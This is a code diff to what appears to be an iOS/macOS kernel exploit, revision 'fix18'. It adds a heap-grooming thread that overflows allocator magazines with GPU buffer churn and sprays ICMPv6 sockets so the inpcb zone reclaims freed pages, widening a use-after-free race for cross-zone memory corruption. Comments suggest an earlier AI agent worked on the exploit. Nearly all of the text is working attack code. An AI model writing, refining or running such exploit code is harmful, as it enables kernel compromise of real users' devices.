@@ -86,7 +86,7 @@ static p017_gettype_t  p017_gettype_fn = NULL;
 #define P017_MAG_CAP            A14_23F77_ZONE_MAGAZINE_CAP
 #define P017_RECLAIM_SPIN       500
 #define P017_A_SPIN             750 /* FIX16: A's spin to widen fn4 window */
-#define P017_BUILD              "p017v2-fix17-lifo-swap-top"
+#define P017_BUILD              "p017v2-fix18-gc-pressure-inpcb"
 #ifndef THREAD_AFFINITY_POLICY_COUNT
 #define THREAD_AFFINITY_POLICY_COUNT 1
 #endif
@@ -115,6 +115,10 @@ static void *p017_repl_page = NULL;
 static volatile long p017_a_iters = 0;
 static volatile long p017_b_iters = 0;
 static volatile long p017_c_iters = 0;
+static volatile long p017_d_iters = 0;   /* FIX18: gc-pressure thread */
+static volatile long p017_d_errs = 0;
+#import <sys/socket.h>
+#import <netinet/in.h>
 static volatile int p017_a_errs = 0;
 static volatile int p017_b_errs = 0;
 static volatile int p017_c_errs = 0;
@@ -555,6 +559,65 @@ static void *p017_thread_c(void *arg) {
 }
 
 // ═══════════════════════════════════════════════════════════════
+// THREAD D — CPU_B (tag 2) — FIX18: magazine-overflow GC pressure +
+// inpcb-claim churn. Two halves per iteration:
+//   (1) create 32 GMDs then drop ALL — the free half (cap 8) overflows 4x,
+//       spilling the depot/global path; freed 0xb0-packed pages return to
+//       the phys free pool via zone page-return (the GC-mediated path the
+//       old agent never tested — the only live route to a cross-zone
+//       aimed shape: A's stale [SysMemory+0x90] read hits whoever
+//       reclaimed the page, e.g. the inpcb zone).
+//   (2) 32 ICMPv6 socket create+close = inpcb-zone pressure claiming the
+//       returned pages (the cskrw pool law, borrowed; kernel-side MD
+//       decode 254/256: detach-bit + size-match + ranges=caller).
+// ═══════════════════════════════════════════════════════════════
+static volatile int p017_d_go = 0;
+
+static void *p017_thread_d(void *arg) {
+    (void)arg;
+    p017_set_thread_policy_tag(P017_AFFINITY_TAG_B);  /* CPU_B — shares the magazine */
+    p017_park_until_go();
+    if (p017_stop) return NULL;
+
+    long local_iter = 0;
+    int local_err = 0;
+
+    while (!p017_stop && p017_d_go) {
+        /* (1) magazine overflow: 32 create → drop all 32 */
+        id<MTLBuffer> burst[32] = {0};
+        int made = 0;
+        for (int i = 0; i < 32; i++) {
+            uint32_t sid = 0;
+            burst[i] = p017_create_resource(&sid, 0);
+            if (burst[i]) made++;
+        }
+        for (int i = 0; i < 32; i++) {
+            if (burst[i]) p017_drop_resource(&burst[i]);
+        }
+        /* (2) inpcb-zone pressure: 32 socket churn cycles */
+        int sfd[32];
+        int sfdn = 0;
+        for (int i = 0; i < 32; i++) {
+            sfd[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+            if (sfd[i] >= 0) sfdn++;
+        }
+        for (int i = 0; i < sfdn; i++) close(sfd[i]);
+        local_iter++;
+        if (sfdn == 0) local_err++;
+
+        if ((local_iter & P017_ITER_FLUSH_MASK) == 0) {
+            p017_d_iters += local_iter;
+            p017_d_errs += local_err;
+            local_iter = 0;
+            local_err = 0;
+        }
+    }
+    p017_d_iters += local_iter;
+    p017_d_errs += local_err;
+    return NULL;
+}
+
+// ═══════════════════════════════════════════════════════════════
 // CALIBRATION
 // ═══════════════════════════════════════════════════════════════
 
@@ -641,12 +704,23 @@ static void p017_race(void) {
     p017_stop = 0;
     p017_race_start = 0;
     p017_thread_a_port = MACH_PORT_NULL;
+    p017_d_go = 1;                   /* FIX18: gc-pressure thread armed */
     p017_a_iters = 0;
     p017_b_iters = 0;
     p017_c_iters = 0;
+    p017_d_iters = 0;
+    p017_d_errs = 0;
     p017_a_errs = 0;
     p017_b_errs = 0;
     p017_c_errs = 0;
+
+    pthread_t td;
+    if (p017_spawn(&td, p017_thread_d, (void *)(uintptr_t)0) == 0) {
+        p017_log(@"[race] D gc-pressure thread started (magazine-overflow + inpcb claim)");
+    } else {
+        p017_log(@"[race] D spawn FAILED (continuing without GC pressure)");
+        p017_d_go = 0;
+    }
 
     p017_log(@"[race] START %ds: A=tag%d B+C=tag%d (split CPU, %d C threads)",
              P017_RACE_SEC, P017_AFFINITY_TAG_A, P017_AFFINITY_TAG_B, P017_NUM_SPRAY_THREADS);
@@ -676,14 +750,16 @@ static void p017_race(void) {
     }
 
     p017_stop = 1;
+    p017_d_go = 0;                   /* FIX18: stop the gc-pressure thread */
     pthread_join(ta, NULL);
     pthread_join(tb, NULL);
     for (int i = 0; i < P017_NUM_SPRAY_THREADS; i++)
         pthread_join(tc[i], NULL);
+    pthread_join(td, NULL);
 
-    p017_log(@"[race] FINAL A=%ld B=%ld C=%ld errA=%d errB=%d errC=%d",
-             p017_a_iters, p017_b_iters, p017_c_iters,
-             p017_a_errs, p017_b_errs, p017_c_errs);
+    p017_log(@"[race] FINAL A=%ld B=%ld C=%ld D=%ld errA=%d errB=%d errC=%d errD=%d",
+             p017_a_iters, p017_b_iters, p017_c_iters, p017_d_iters,
+             p017_a_errs, p017_b_errs, p017_c_errs, p017_d_errs);
     p017_log(@"[race] SURVIVED — check ips if panicked; else race missed");
 }
 
